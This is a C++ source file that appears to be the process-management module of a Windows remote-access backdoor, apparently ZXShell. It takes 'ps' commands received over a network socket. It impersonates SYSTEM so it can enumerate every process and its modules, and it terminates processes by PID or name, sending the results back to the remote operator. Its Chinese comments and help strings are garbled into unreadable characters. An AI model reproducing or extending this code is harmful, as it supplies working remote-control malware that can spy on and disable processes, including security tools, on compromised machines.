/*
���̴���
*/
#include <windows.h>
#include <stdio.h>
#include <psapi.H>
#include "runas.h"
#pragma comment(lib, "psapi.lib")

/*
int AddPrivilege(const char *Name)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tp;
	LUID Luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,
		&hToken))
	{
		printf("OpenProcess Token error.\n");
		return 1;
	}

	if (!LookupPrivilegeValue(NULL,Name,&Luid))
	{
		printf("LookupPrivilegeValue error.\n");
		return 1;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = Luid;

	if (!AdjustTokenPrivileges(hToken,
		0,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		NULL,
		NULL))
	{
		printf("AdjustTokenPrivileges error.\n");
		return 1;
	}

	return 0;
}
*/
void PS_usage(SOCKET Socket)
{
SendMessage(Socket, "\
\r\n\
ps -l\t �г����н���\r\n\
ps -ms name\t �г�������ָ��ģ�����Ľ���\r\n\
ps -mp pid\t �г�ָ�����̵�����ģ��\r\n\
ps -kp pid\t �ر�һ������\r\n\
ps -kn name\t �ر�����ָ���Ľ�����\r\n");
}

int Process(MainPara *args)
{
	SPAMFUNCTION

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;

	DWORD dwDesiredAccess = PROCESS_QUERY_INFORMATION|PROCESS_VM_READ;
	unsigned int i,j;
	DWORD aProcesses[1024], cbNeeded;
	char szProcessName[MAX_PATH],szModuleFile[MAX_PATH];
	char basename[MAX_PATH];
	TCHAR szUserName[MAX_PATH]="\0",szDomainName[MAX_PATH]="\0";
	HANDLE hProcess;
	int pid;
	char *ModuName,*ProcName;

	bool IsListProc=0,IsModu=0,ListModu=0,SearchModu=0,KillByPid=0,KillByName=0;
	
	for(i=1;i<argc;i++)
		switch(argv[i][0])
	{
		case '-':
			{
				switch(argv[i][1])
				{
				case 'l':
					{
						IsListProc=true;
						break;
					}
				case 'm':
					{
						if(argc<3){
							SendMessage(Socket, "ps -ms name\r\nps -mp pid\r\n");
							return 1;
						}
						IsModu=true;
						switch(argv[i][2])
						{
						case 's':
							{
								SearchModu=true;
								ModuName=argv[i+1];
								break;
							}
						case 'p':
							{
								ListModu=true;
								pid=atoi(argv[i+1]);
								break;
							}
							SendMessage(Socket, "ps -ms name\r\nps -mp pid\r\n");
							return 1;
						}
						break;
					}
				case 'k':
					{
						if(argc<3){
							SendMessage(Socket, "ps -kn name\r\nps -kp pid\r\n");
							return 1;
						}
						switch(argv[i][2])
						{
							case 'n':
								KillByName=true;
								ProcName=argv[i+1];
								break;
							case 'p':
								KillByPid=true;
								pid=atoi(argv[i+1]);
								break;
							SendMessage(Socket, "ps -kn name\r\nps -kp pid\r\n");
							return 1;
						}
					}
				}
				break;
			}

			return 1;
	}
	if(IsListProc==0&&ListModu==0&&SearchModu==0&&KillByPid==0&&KillByName==0)
	{
		PS_usage(Socket);
		return 1;
	}
	
	
	//ģ��systemȨ��
	_CImpersonateSystem g_cis;

	if (!ZXSAPI::EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
	{
		SendMessage(Socket, "EnumProcesses() error.\r\n");
		return 1;
	}
	for ( i = 0; i < cbNeeded / sizeof(DWORD); i++ )
	{
		hProcess = ZXSAPI::OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, aProcesses[i]);

		if ( hProcess )
		{
			HMODULE hMod[1024];
			DWORD mcbNeeded = 0;
			memset(hMod, 0, sizeof(hMod));
			memset(szUserName, 0, sizeof(szUserName));
			memset(szDomainName, 0, sizeof(szDomainName));
			memset(szProcessName, 0, sizeof(szProcessName));
			memset(basename, 0, sizeof(basename));
			GetProcessUser(hProcess, szDomainName, szUserName, MAX_PATH);
			if ( ZXSAPI::EnumProcessModules( hProcess, hMod, sizeof(hMod), &mcbNeeded))
			{
				ZXSAPI::GetModuleFileNameEx( hProcess, hMod[0], szProcessName,sizeof(szProcessName));
				ZXSAPI::GetModuleBaseName( hProcess, hMod[0], basename,sizeof(basename));
			}
			if((KillByPid&&aProcesses[i]==pid)||(KillByName&&!stricmp(basename, ProcName)))
			{
				CloseHandle( hProcess );
				//���´򿪾���PROCESS_TERMINATE�ķ���Ȩ
				hProcess = ZXSAPI::OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,
					FALSE, aProcesses[i]);
				if ( hProcess )
				{
					SendMessage(Socket, "%d\t%s\\%s\t%s\r\n",aProcesses[i],szDomainName,szUserName,szProcessName);
					ZXSAPI::TerminateProcess(hProcess,0);
				}
			}
			if(IsListProc)
				SendMessage(Socket, "%d\t%s\\%s\t%s\r\n",aProcesses[i],szDomainName,szUserName,szProcessName);
			if(ListModu&&pid==aProcesses[i])
				SendMessage(Socket, "ModulePath\tBaseAddress\r\n");

			if(IsModu)
			for ( j = 0; j < (mcbNeeded / sizeof(HMODULE)); j++ )
			{
				if(ListModu){
					if(pid!=aProcesses[i])
						break;
					memset(szModuleFile, 0, sizeof(szModuleFile));
					ZXSAPI::GetModuleFileNameEx( hProcess, hMod[j], szModuleFile,sizeof(szModuleFile));
					SendMessage(Socket, "%s\t<0x%.8X>\r\n",szModuleFile, hMod[j]);
				}
				if(SearchModu){

					if(ZXSAPI::GetModuleBaseName( hProcess, hMod[j], basename,sizeof(basename)))
					{
						if(strstr(basename, ModuName))
						{
							SendMessage(Socket, "%d\t%s\\%s\t%s\r\n",aProcesses[i],szDomainName,szUserName,szProcessName);
						}
					}
				}

			}
			CloseHandle( hProcess );
		}

	}
	return 0;
}